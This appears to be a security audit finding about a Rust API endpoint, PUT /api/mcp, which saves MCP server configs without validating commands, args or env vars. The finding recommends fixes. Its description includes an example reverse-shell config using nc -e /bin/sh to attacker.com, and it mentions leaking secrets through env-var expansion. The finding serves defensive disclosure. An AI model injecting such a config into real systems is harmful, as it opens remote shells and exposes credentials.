# PUT /api/mcp accepts arbitrary MCP server config with no content validation

- **Difficulty:** easy
- **Urgency:** high
- **File:** `src/api/mcp.rs`
- **Lines:** 39-46

## Description

`PUT /api/mcp` writes raw request bytes verbatim via `McpFile::save_raw`, which only validates JSON parseability and `version == 1` (`mcp/mod.rs:167-173`). There is no validation of server names, command paths, args, env var names/values, or URLs. A paired device can inject `{"command": "nc", "args": ["-e", "/bin/sh", "attacker.com", "4444"]}` or reference daemon secrets via `${DEVIN_API_KEY}` (see mcp-env-expansion-leaks-secrets). The config is then sent to the agent via `session/new`, and the agent spawns the MCP server. Unlike `profiles.json` which has thorough validation (`profile_config.rs:218-255`), `mcp.json` has none beyond JSON syntax.

## Recommendation

Add content validation to `McpFile::save_raw` (or a new validation function): validate server names against the same character rules as `profile_config.rs:395`, validate that stdio commands are absolute paths or resolve on `PATH`, reject shell metacharacters in args, and reject env var names matching secret patterns. Apply the same `MAX_FILE_BYTES` cap that profiles uses.

## Verification

`src/api/mcp.rs:44` calls `McpFile::save_raw(path, &body)`. `src/mcp/mod.rs:167-173` `save_raw` only parses + checks version. No validation function is called. Compare `src/acp/profile_config.rs:185-188` which calls `config.validate()`.
